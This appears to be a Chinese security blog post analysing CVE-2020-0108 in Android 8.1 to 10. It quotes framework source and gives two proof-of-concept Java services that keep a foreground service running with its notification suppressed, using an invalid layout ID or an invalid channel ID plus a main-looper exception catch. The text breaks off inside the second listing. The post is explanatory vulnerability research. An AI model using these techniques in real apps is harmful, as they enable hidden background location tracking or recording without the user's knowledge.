  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2022/06/25/Android-Foreground-%E9%A9%BB%E7%95%99%E6%BC%8F%E6%B4%9E-CVE-2020-0108/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/06/25/Android-Foreground-%E9%A9%BB%E7%95%99%E6%BC%8F%E6%B4%9E-CVE-2020-0108/" class="post-title-link" itemprop="url">Android Foreground 驻留漏洞(CVE-2020-0108)</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-06-25 10:44:25 / Modified: 19:45:58" itemprop="dateCreated datePublished" datetime="2022-06-25T10:44:25+08:00">2022-06-25</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前台服务的处理代码中存在着逻辑漏洞，成功利用该漏洞的攻击者可以绕过前台服务的通知显示并持续在后台运行，可以在后台进行一些定位、录音等操作。</p>
<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>Android 8.1、9、10。</p>
<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><ul>
<li>前台服务是Google在Android 8.0中引入的概念，由于Android 8.0不允许后台启动后台服务，所以设计了前台服务，前台服务优先级较高，可以长时间在后台运行，但是前台服务在启动后5秒必须绑定一个通知，否则会被杀死。</li>
<li>实际上，前台服务依旧是在“后台”运行的，只是由于绑定了一个用户可见的通知，所以Google称之为“前台服务”。</li>
</ul>
<h2 id="漏洞1"><a href="#漏洞1" class="headerlink" title="漏洞1"></a>漏洞1</h2><p><code>NotificationManagerService.java</code>的<a target="_blank" rel="noopener" href="https://cs.android.com/android/platform/superproject/+/android-10.0.0_r29:frameworks/base/services/core/java/com/android/server/notification/NotificationManagerService.java;bpv=1;bpt=1;l=903?gsn=onNotificationError&gs=kythe://android.googlesource.com/platform/superproject?lang=java?path=%253Canonymous%2520com.android.server.notification.NotificationManagerService%25241%253E%23dadec13a7bb2927b4b551d172e3fa71b36e2b7496f6577cba42918727fdf287e"><code>onNotificationError()</code></a>方法，未能正确处理通知显示时的异常。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onNotificationError</span><span class="params">(<span class="type">int</span> callingUid, <span class="type">int</span> callingPid, String pkg, String tag, <span class="type">int</span> id,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> uid, <span class="type">int</span> initialPid, String message, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line">    cancelNotification(callingUid, callingPid, pkg, tag, id, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">false</span>, userId,</span><br><span class="line">            REASON_ERROR, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前台服务启动后，即使未能正确地显示通知，也不会导致前台服务终止。比如前台服务在创建通知时使用了自定义的布局，在创建<code>RemoteViews</code>对象时传入了一个不存在的<code>layout ID</code>，造成<code>NotificationManagerService</code>对通知的布局解析失败而抛出异常，此时会调用到<code>onNitificationError</code>方法。由于<code>onNotificationError</code>方法中只是调用了<code>cancelNotification</code>方法来取消通知，而没有去终止服务或终止整个应用程序，这时候前台服务就会在不显示通知的情况下继续运行。</p>
<p>实际测试好像还是需要捕获异常才行，否则应用直接崩溃，但是没看见在哪抛出异常啊。</p>
<h2 id="漏洞2"><a href="#漏洞2" class="headerlink" title="漏洞2"></a>漏洞2</h2><p><code>ServiceRecord</code>中<code>postNotification</code>方法中，没有正确处理通知显示中的异常情况，而是将异常抛出给了用户程序。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postNotification</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">appUid</span> <span class="operator">=</span> appInfo.uid;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">appPid</span> <span class="operator">=</span> app.pid;</span><br><span class="line">    <span class="keyword">if</span> (foregroundId != <span class="number">0</span> &amp;&amp; foregroundNoti != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Do asynchronous communication with notification manager to</span></span><br><span class="line">        <span class="comment">// avoid deadlocks.</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">localPackageName</span> <span class="operator">=</span> packageName;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">localForegroundId</span> <span class="operator">=</span> foregroundId;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Notification</span> <span class="variable">_foregroundNoti</span> <span class="operator">=</span> foregroundNoti;</span><br><span class="line">        ams.mHandler.post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="type">NotificationManagerInternal</span> <span class="variable">nm</span> <span class="operator">=</span> LocalServices.getService(</span><br><span class="line">                        NotificationManagerInternal.class);</span><br><span class="line">                <span class="keyword">if</span> (nm == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">Notification</span> <span class="variable">localForegroundNoti</span> <span class="operator">=</span> _foregroundNoti;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (localForegroundNoti.getSmallIcon() == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// It is not correct for the caller to not supply a notification</span></span><br><span class="line">                        <span class="comment">// icon, but this used to be able to slip through, so for</span></span><br><span class="line">                        <span class="comment">// those dirty apps we will create a notification clearly</span></span><br><span class="line">                        <span class="comment">// blaming the app.</span></span><br><span class="line">                        Slog.v(TAG, <span class="string">&quot;Attempted to start a foreground service (&quot;</span></span><br><span class="line">                                + shortInstanceName</span><br><span class="line">                                + <span class="string">&quot;) with a broken notification (no icon: &quot;</span></span><br><span class="line">                                + localForegroundNoti</span><br><span class="line">                                + <span class="string">&quot;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="type">CharSequence</span> <span class="variable">appName</span> <span class="operator">=</span> appInfo.loadLabel(</span><br><span class="line">                                ams.mContext.getPackageManager());</span><br><span class="line">                        <span class="keyword">if</span> (appName == <span class="literal">null</span>) &#123;</span><br><span class="line">                            appName = appInfo.packageName;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            ctx = ams.mContext.createPackageContextAsUser(</span><br><span class="line">                                    appInfo.packageName, <span class="number">0</span>, <span class="keyword">new</span> <span class="title class_">UserHandle</span>(userId));</span><br><span class="line"></span><br><span class="line">                            Notification.<span class="type">Builder</span> <span class="variable">notiBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Notification</span>.Builder(ctx,</span><br><span class="line">                                    localForegroundNoti.getChannelId());  &lt;------- <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                            <span class="comment">// it&#x27;s ugly, but it clearly identifies the app</span></span><br><span class="line">                            notiBuilder.setSmallIcon(appInfo.icon);</span><br><span class="line"></span><br><span class="line">                            <span class="comment">// mark as foreground</span></span><br><span class="line">                            notiBuilder.setFlag(Notification.FLAG_FOREGROUND_SERVICE, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="type">Intent</span> <span class="variable">runningIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(</span><br><span class="line">                                    Settings.ACTION_APPLICATION_DETAILS_SETTINGS);</span><br><span class="line">                            runningIntent.setData(Uri.fromParts(<span class="string">&quot;package&quot;</span>,</span><br><span class="line">                                    appInfo.packageName, <span class="literal">null</span>));</span><br><span class="line">                            <span class="type">PendingIntent</span> <span class="variable">pi</span> <span class="operator">=</span> PendingIntent.getActivityAsUser(ams.mContext, <span class="number">0</span>,</span><br><span class="line">                                    runningIntent, PendingIntent.FLAG_UPDATE_CURRENT, <span class="literal">null</span>,</span><br><span class="line">                                    UserHandle.of(userId));</span><br><span class="line">                            notiBuilder.setColor(ams.mContext.getColor(</span><br><span class="line">                                    com.android.internal</span><br><span class="line">                                            .R.color.system_notification_accent_color));</span><br><span class="line">                            notiBuilder.setContentTitle(</span><br><span class="line">                                    ams.mContext.getString(</span><br><span class="line">                                            com.android.internal.R.string</span><br><span class="line">                                                    .app_running_notification_title,</span><br><span class="line">                                            appName));</span><br><span class="line">                            notiBuilder.setContentText(</span><br><span class="line">                                    ams.mContext.getString(</span><br><span class="line">                                            com.android.internal.R.string</span><br><span class="line">                                                    .app_running_notification_text,</span><br><span class="line">                                            appName));</span><br><span class="line">                            notiBuilder.setContentIntent(pi);</span><br><span class="line"></span><br><span class="line">                            localForegroundNoti = notiBuilder.build();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (PackageManager.NameNotFoundException e) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (nm.getNotificationChannel(localPackageName, appUid,</span><br><span class="line">                            localForegroundNoti.getChannelId()) == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">targetSdkVersion</span> <span class="operator">=</span> Build.VERSION_CODES.O_MR1;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">final</span> <span class="type">ApplicationInfo</span> <span class="variable">applicationInfo</span> <span class="operator">=</span></span><br><span class="line">                                    ams.mContext.getPackageManager().getApplicationInfoAsUser(</span><br><span class="line">                                            appInfo.packageName, <span class="number">0</span>, userId);</span><br><span class="line">                            targetSdkVersion = applicationInfo.targetSdkVersion;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (PackageManager.NameNotFoundException e) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (targetSdkVersion &gt;= Build.VERSION_CODES.O_MR1) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(</span><br><span class="line">                                    <span class="string">&quot;invalid channel for service notification: &quot;</span></span><br><span class="line">                                            + foregroundNoti);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (localForegroundNoti.getSmallIcon() == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// Notifications whose icon is 0 are defined to not show</span></span><br><span class="line">                        <span class="comment">// a notification, silently ignoring it.  We don&#x27;t want to</span></span><br><span class="line">                        <span class="comment">// just ignore it, we want to prevent the service from</span></span><br><span class="line">                        <span class="comment">// being foreground.</span></span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;invalid service notification: &quot;</span></span><br><span class="line">                                + foregroundNoti);</span><br><span class="line">                    &#125;</span><br><span class="line">                    nm.enqueueNotification(localPackageName, localPackageName,</span><br><span class="line">                            appUid, appPid, <span class="literal">null</span>, localForegroundId, localForegroundNoti,</span><br><span class="line">                            userId);</span><br><span class="line"></span><br><span class="line">                    foregroundNoti = localForegroundNoti; <span class="comment">// save it for amending next time</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (RuntimeException e) &#123; &lt;------- <span class="number">2</span></span><br><span class="line">                    Slog.w(TAG, <span class="string">&quot;Error showing notification for service&quot;</span>, e);</span><br><span class="line">                    <span class="comment">// If it gave us a garbage notification, it doesn&#x27;t</span></span><br><span class="line">                    <span class="comment">// get to be foreground.</span></span><br><span class="line">                    ams.setServiceForeground(instanceName, ServiceRecord.<span class="built_in">this</span>,</span><br><span class="line">                            <span class="number">0</span>, <span class="literal">null</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">                    ams.crashApplication(appUid, appPid, localPackageName, -<span class="number">1</span>,</span><br><span class="line">                            <span class="string">&quot;Bad notification for startForeground: &quot;</span> + e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这种情况下，前台服务启动后，若用户程序捕获了主线程的异常，即使未能正确显示通知，也不会导致前台服务终止。比如说前台服务在创建通知时传入了不合法的<code>Channel ID</code>，这样在<code>ServiceRecord</code>的<code>postNotification</code>方法中发送通知时，就会抛出异常。在异常处理过程中，只是调用了AMS的<code>crashApplication</code>方法来向应用抛出一个主线程的异常，但是如果应用在主线程捕获了异常，则应用就不会崩溃，这时候前台服务就会在不显示通知的情况下继续运行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">crashApplication</span><span class="params">(<span class="type">int</span> uid, <span class="type">int</span> initialPid, String packageName, <span class="type">int</span> userId,</span></span><br><span class="line"><span class="params">        String message)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (checkCallingPermission(android.Manifest.permission.FORCE_STOP_PACKAGES)</span><br><span class="line">            != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Permission Denial: crashApplication() from pid=&quot;</span></span><br><span class="line">                + Binder.getCallingPid()</span><br><span class="line">                + <span class="string">&quot;, uid=&quot;</span> + Binder.getCallingUid()</span><br><span class="line">                + <span class="string">&quot; requires &quot;</span> + android.Manifest.permission.FORCE_STOP_PACKAGES;</span><br><span class="line">        Slog.w(TAG, msg);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="built_in">this</span>) &#123;</span><br><span class="line">        mAppErrors.scheduleAppCrashLocked(uid, initialPid, packageName, userId, message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="漏洞1-1"><a href="#漏洞1-1" class="headerlink" title="漏洞1"></a>漏洞1</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FServiceA</span> <span class="keyword">extends</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;FServiceA&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Return the communication channel to the service.</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Not yet implemented&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">onStartCommand</span><span class="params">(Intent intent, <span class="type">int</span> flags, <span class="type">int</span> startId)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Handler</span>(Looper.getMainLooper()).post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Looper.loop();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">      </span><br><span class="line">        <span class="type">NotificationManager</span> <span class="variable">notificationManager</span> <span class="operator">=</span> (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);</span><br><span class="line">        <span class="type">NotificationChannel</span> <span class="variable">notificationChannel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationChannel</span>(<span class="string">&quot;c01&quot;</span>, <span class="string">&quot;CVE-2020-0108&quot;</span>, NotificationManager.IMPORTANCE_DEFAULT);</span><br><span class="line">        notificationChannel.setDescription(<span class="string">&quot;Testing CVE-2020-0108&quot;</span>);</span><br><span class="line">        notificationChannel.enableLights(<span class="literal">true</span>);</span><br><span class="line">        notificationChannel.setLightColor(Color.RED);</span><br><span class="line">        notificationChannel.enableVibration(<span class="literal">true</span>);</span><br><span class="line">        notificationChannel.setVibrationPattern(<span class="keyword">new</span> <span class="title class_">long</span>[]&#123;<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>, <span class="number">400</span>, <span class="number">500</span>, <span class="number">400</span>, <span class="number">300</span>, <span class="number">200</span>, <span class="number">100</span>&#125;);</span><br><span class="line">        notificationManager.createNotificationChannel(notificationChannel);</span><br><span class="line">      </span><br><span class="line"><span class="comment">//        Create a RemoteViews object with a invalid layout ID</span></span><br><span class="line">        <span class="type">RemoteViews</span> <span class="variable">remoteViews</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteViews</span>(getPackageName(), -<span class="number">1</span> <span class="comment">/* A Invalid Layout ID */</span>);</span><br><span class="line">        <span class="type">Notification</span> <span class="variable">notification</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationCompat</span>.Builder(<span class="built_in">this</span>, <span class="string">&quot;c01&quot;</span>)</span><br><span class="line">                .setContentTitle(<span class="string">&quot;Testing CVE-2020-0108&quot;</span>)</span><br><span class="line">                .setContentText(<span class="string">&quot;If you see this means you device is not vulnerable&quot;</span>)</span><br><span class="line">                .setCustomBigContentView(remoteViews)</span><br><span class="line">                .setWhen(System.currentTimeMillis())</span><br><span class="line">                .setSmallIcon(R.drawable.ic_launcher_foreground)</span><br><span class="line">                .setLargeIcon(BitmapFactory.decodeResource(getResources(), 	R.drawable.ic_launcher_foreground))</span><br><span class="line">                .build();</span><br><span class="line">        startForeground(<span class="number">1</span>, notification);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">MyRunnable</span>()).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyRunnable</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">15</span>; i++) &#123;</span><br><span class="line">                Log.e(<span class="string">&quot;onNotificationError&quot;</span>,<span class="string">&quot;Run Count: &quot;</span> + i);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞2-1"><a href="#漏洞2-1" class="headerlink" title="漏洞2"></a>漏洞2</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FServiceB</span> <span class="keyword">extends</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;FServiceB&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Return the communication channel to the service.</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Not yet implemented&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">onStartCommand</span><span class="params">(Intent intent, <span class="type">int</span> flags, <span class="type">int</span> startId)</span> &#123;</span><br><span class="line"><span class="comment">//        Handle the exception in main loop</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Handler</span>(Looper.getMainLooper()).post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Looper.loop();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"><span class="comment">//        Create a Notification object with a invalid channel ID</span></span><br><span class="line">        <span class="type">Notification</span> <span class="variable">notification</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationCompat</span>.Builder(<span class="built_in">this</span>, <span class="string">&quot;InvalidInvalidInvalid&quot;</span> <span class="comment">/* A Invalid Channel ID */</span>)</span><br><span class="line">                .setContentTitle(<span class="string">&quot;Testing CVE-2020-0108&quot;</span>)</span><br><span class="line">                .setContentText(<span class="string">&quot;If you see this means you device is not vulnerable&quot;</span>)</span><br><span class="line">                .setWhen(System.currentTimeMillis())</span><br><span class="line">                .setSmallIcon(R.drawable.ic_launcher_foreground)</span><br><span class="line">                .setLargeIcon(BitmapFactory.decodeResource(getResources(), R.drawable.ic_launcher_foreground))</span><br><span class="line">                .build();</span><br><span class="line">        startForeground(<span class="number">2</span>, notification);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title 